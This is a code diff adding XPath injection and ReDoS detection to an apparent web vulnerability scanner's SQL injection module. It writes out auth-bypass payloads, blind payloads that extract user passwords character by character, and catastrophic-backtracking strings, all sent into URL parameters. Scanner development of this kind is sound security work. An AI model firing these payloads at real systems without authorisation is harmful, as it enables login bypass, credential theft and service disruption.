@@ -520,6 +520,124 @@ class SQLInjectionScanner(BaseScanner):
         self._run_second_order_phase(urls)
         self._run_stored_sqli_phase(urls)
 
+        # --- XPath Injection & ReDoS ----------------------------------------
+        for u in urls:
+            self._run_xpath_injection(u)
+            self._run_redos(u)
+
+    def _run_xpath_injection(self, url: str) -> None:
+        """XPath injection — auth bypass + blind veri sızdırma."""
+        parsed = urlparse(url)
+        params = parse_qsl(parsed.query)
+        if not params:
+            return
+
+        # Auth bypass payloads
+        bypass_payloads = [
+            "' or '1'='1",
+            "' or 1=1 or ''='",
+            "x' or name()='username",
+            "' or contains(name(),'user') or ''='",
+            "admin' or '1'='1",
+            "' or position()=1 or ''='",
+            "1' or '1'='1",
+        ]
+        # Blind boolean payloads for data extraction
+        blind_payloads = [
+            "' and substring(//user[1]/password,1,1)='a",
+            "' and string-length(//user[1]/username)>0 and ''='",
+            "' or count(//user)>0 or ''='",
+        ]
+
+        xpath_errors = [
+            r"XPathException", r"javax\.xml\.xpath", r"net\.sf\.saxon",
+            r"System\.Xml\.XPath", r"XPath.*error", r"Invalid XPath",
+            r"xpath.*exception", r"SimpleXMLElement", r"DOMXPath",
+            r"Failed to parse.*xpath", r"xmlXPathEval",
+        ]
+
+        for param, _ in params:
+            baseline = self.fetch_baseline(url)
+            if not baseline:
+                continue
+            b_text = baseline.text or ""
+
+            for payload in bypass_payloads + blind_payloads:
+                injected = self.inject_param(url, param, payload)
+                try:
+                    resp = self.session.get(injected, timeout=8)
+                except Exception:
+                    continue
+                text = resp.text or ""
+                # Error-based detection
+                for sig in xpath_errors:
+                    if re.search(sig, text, re.IGNORECASE):
+                        self.report_finding(
+                            vuln_type="XPath Injection",
+                            url=url, param=param, payload=payload,
+                            severity="High",
+                            evidence=f"XPath error signature: {sig}",
+                            detection_method="error_based",
+                        )
+                        return
+                # Auth bypass: significantly different response (login succeeded)
+                if (resp.status_code != baseline.status_code
+                        and resp.status_code == 200
+                        and len(text) > len(b_text) * 1.3):
+                    self.report_finding(
+                        vuln_type="XPath Injection (Auth Bypass)",
+                        url=url, param=param, payload=payload,
+                        severity="Critical",
+                        evidence=f"Status changed {baseline.status_code}→{resp.status_code}, body grew {len(text)-len(b_text)} bytes",
+                        detection_method="boolean_blind",
+                    )
+                    return
+
+    def _run_redos(self, url: str) -> None:
+        """ReDoS — input alanlarına catastrophic backtracking payloads enjekte et."""
+        parsed = urlparse(url)
+        params = parse_qsl(parsed.query)
+        if not params:
+            return
+
+        # Payloads known to trigger catastrophic backtracking in common regex patterns
+        redos_payloads = [
+            "a" * 50 + "!",
+            "(" * 20 + "a" * 20 + ")" * 20 + "!",
+            "aaaaaaaaaaaaaaaaaaaaaaaaaaaa!",
+            "a" * 30 + "b",
+            "1" * 40 + "@",
+        ]
+
+        SLOW_THRESHOLD = 3.0  # seconds
+
+        for param, _ in params:
+            # Establish baseline timing
+            try:
+                t0 = time.monotonic()
+                self.session.get(url, timeout=10)
+                baseline_ms = (time.monotonic() - t0) * 1000
+            except Exception:
+                continue
+
+            for payload in redos_payloads:
+                injected = self.inject_param(url, param, payload)
+                try:
+                    t0 = time.monotonic()
+                    self.session.get(injected, timeout=10)
+                    elapsed = time.monotonic() - t0
+                except Exception:
+                    continue
+                if elapsed > baseline_ms / 1000 + SLOW_THRESHOLD:
+                    self.report_finding(
+                        vuln_type="ReDoS (Regular Expression Denial of Service)",
+                        url=url, param=param, payload=payload,
+                        severity="Medium",
+                        evidence=f"Response time {elapsed:.2f}s (baseline {baseline_ms:.0f}ms) — catastrophic backtracking",
+                        detection_method="time_based",
+                    )
+                    break  # one confirmation per param is enough
+
     def scan_url(self, url: str):
         parsed = urlparse(url)
         params = parse_qsl(parsed.query)
